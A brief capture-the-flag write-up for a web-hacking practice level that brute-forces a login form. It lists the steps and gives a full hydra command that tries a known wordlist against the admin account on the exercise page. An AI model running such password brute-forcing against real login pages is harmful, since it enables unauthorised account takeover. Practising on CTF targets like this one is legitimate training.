This will be solution for Level 12  [Practical Web Hacking](http://ctf.infosecinstitute.com "Practical Web Hacking") CTF #2. 

In this level unfortunately we have a very realistic example of how easy it is to bruteforce web applications, our objective is to try to bruteforce a login and password.
The procedure is very simple we need to collect the information that would allow us to execute the requested as if it were made by the browser.

## Tasks
1. Collect input names.
3. find the sugested wordlist.
2. setup hydra.


The world list suggested is a very known from john ripper, so we set our brute force application with the following.

{% highlight bash %}
	hydra ctf.infosecinstitute.com http-form-post \
	"/ctf2/exercises/ex12.php:username=^USER^&password=^PASS^&logIn=Login:\
	Incorrect username or password combination" \
	-l admin -P password-2011.lst -t 10 -w 30 -o logins.txt 
{% endhighlight %}
